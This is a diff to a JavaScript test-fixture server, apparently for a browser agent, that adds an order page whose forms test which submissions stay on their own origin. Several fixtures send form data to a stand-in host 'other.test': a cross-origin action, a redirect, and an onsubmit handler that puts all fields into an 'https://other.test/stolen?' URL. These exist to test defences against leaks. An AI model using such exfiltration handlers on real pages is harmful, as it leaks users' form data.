@@ -247,6 +247,27 @@ const FORM_NAMES = `<!doctype html><meta charset="utf-8"><title>Names</title>
 <a href="/x">A link</a> <button type="button">A button</button>
 <iframe src="/frame-names"></iframe>`;
 const FRAME_NAMES = `<!doctype html><meta charset="utf-8"><label>Inner <input type="text" name="inner"></label>`;
+// SG-000122 slice A6: forms an approved Enter submits. The order form posts
+// to its own origin (its result page echoes what arrived); the track form
+// is a GET on its own origin. Each other form tries to leave the origin: by
+// its action, by a same-origin action that redirects away, and by a submit
+// handler that moves the page away. A field outside any form submits
+// nothing.
+const ENTER_FORM = `<!doctype html><meta charset="utf-8"><title>Order</title>
+<form action="/order" method="post">
+<label>Full name <input type="text" name="full_name"></label>
+<label>City <select name="city"><option>Lisbon</option><option>Porto</option></select></label>
+<label><input type="checkbox" name="gift"> Gift wrap</label>
+<label>Email <input type="email" name="email"></label>
+<button>Place order</button>
+</form>
+<form action="/track" method="get"><label>Tracking number <input type="search" name="number"></label></form>
+<form action="https://other.test/collect" method="post"><label>Coupon <input type="text" name="coupon"></label></form>
+<form action="/order-away" method="post"><label>Voucher <input type="text" name="voucher"></label></form>
+<form action="/track" onsubmit="event.preventDefault(); location.href = 'https://other.test/stolen?' + new URLSearchParams(new FormData(this));"><label>Promo code <input type="text" name="promo"></label></form>
+<label>Loose note <input type="text" name="loose"></label>`;
+const escapeHtml = (text) => text.replace(/[&<>"']/g, (ch) => `&#${ch.charCodeAt(0)};`);
+
 // BR-07: a page to verify postconditions against.
 const VERIFY = `<!doctype html><meta charset="utf-8"><title>Order 42</title>
 <h1>Order confirmed</h1>
@@ -416,6 +437,28 @@ setInterval(round, 5000);
     });
     return;
   }
+  // SG-000122 slice A6: the order form's result echoes what arrived.
+  if (path === "/order" && request.method === "POST") {
+    let body = "";
+    request.on("data", (chunk) => (body += chunk));
+    request.on("end", () => {
+      const fields = new URLSearchParams(body);
+      const line = `Order placed for ${fields.get("full_name") ?? ""} in ${fields.get("city") ?? ""}, gift wrap ${fields.has("gift") ? "yes" : "no"}`;
+      response.setHeader("content-type", "text/html; charset=utf-8");
+      response.end(`<!doctype html><meta charset="utf-8"><title>Order placed</title><h1>Thank you</h1><p id="summary">${escapeHtml(line)}</p>`);
+    });
+    return;
+  }
+  if (path.startsWith("/track?")) {
+    const number = new URL(path, "https://fixture.test").searchParams.get("number") ?? "";
+    response.setHeader("content-type", "text/html; charset=utf-8");
+    return response.end(`<!doctype html><meta charset="utf-8"><title>Tracking</title><p>Tracking ${escapeHtml(number)}: shipped</p>`);
+  }
+  if (path === "/order-away") {
+    response.statusCode = 303;
+    response.setHeader("location", "https://other.test/stolen");
+    return response.end();
+  }
   if (path === "/redirect-same") return redirect("/landing");
   if (path === "/site/moved") return redirect("/site/c");
   if (path === "/site/away") return redirect("/elsewhere");
@@ -512,7 +555,7 @@ trailer << /Root 1 0 R >>
     response.setHeader("content-security-policy", "img-src 'self'; report-to csp");
   }
   if (path === "/form-names") response.setHeader("content-type", "text/html; charset=utf-8");
-  const pages = { "/mixed": MIXED, "/spec-escape": SPEC_ESCAPE, "/reports": REPORTS, "/self-move": SELF_MOVE, "/archive": ARCHIVE, "/archive-hostile": ARCHIVE_HOSTILE, "/files": FILES, "/archive-tricky": ARCHIVE_TRICKY, "/archive-rerender": ARCHIVE_RERENDER, "/archive-rerender-swap": ARCHIVE_RERENDER_SWAP, "/archive-rerender-twins": ARCHIVE_RERENDER_TWINS, "/secret-name": SECRET_NAME, "/tools": TOOLS, "/tools-none": NO_TOOLS, "/tools-control": TOOLS_CONTROL, "/exec": EXEC, "/read": READ, "/verify-page": VERIFY, "/form-page": FORM, "/form-names": FORM_NAMES, "/frame-names": FRAME_NAMES, "/occluded": OCCLUDED, "/upload-page": UPLOAD, "/dialog-page": DIALOG, "/leave-page": LEAVE, "/frames": FRAMES, "/frame-outer": FRAME_OUTER, "/frame-inner": FRAME_INNER, "/frame-foreign": FRAME_FOREIGN };
+  const pages = { "/enter-form": ENTER_FORM, "/mixed": MIXED, "/spec-escape": SPEC_ESCAPE, "/reports": REPORTS, "/self-move": SELF_MOVE, "/archive": ARCHIVE, "/archive-hostile": ARCHIVE_HOSTILE, "/files": FILES, "/archive-tricky": ARCHIVE_TRICKY, "/archive-rerender": ARCHIVE_RERENDER, "/archive-rerender-swap": ARCHIVE_RERENDER_SWAP, "/archive-rerender-twins": ARCHIVE_RERENDER_TWINS, "/secret-name": SECRET_NAME, "/tools": TOOLS, "/tools-none": NO_TOOLS, "/tools-control": TOOLS_CONTROL, "/exec": EXEC, "/read": READ, "/verify-page": VERIFY, "/form-page": FORM, "/form-names": FORM_NAMES, "/frame-names": FRAME_NAMES, "/occluded": OCCLUDED, "/upload-page": UPLOAD, "/dialog-page": DIALOG, "/leave-page": LEAVE, "/frames": FRAMES, "/frame-outer": FRAME_OUTER, "/frame-inner": FRAME_INNER, "/frame-foreign": FRAME_FOREIGN };
   if (SITE[path]) return response.end(SITE[path]);
   response.end(pages[path] ?? `<!doctype html><title>${host}${path}</title><p>fixture</p>`);
 });
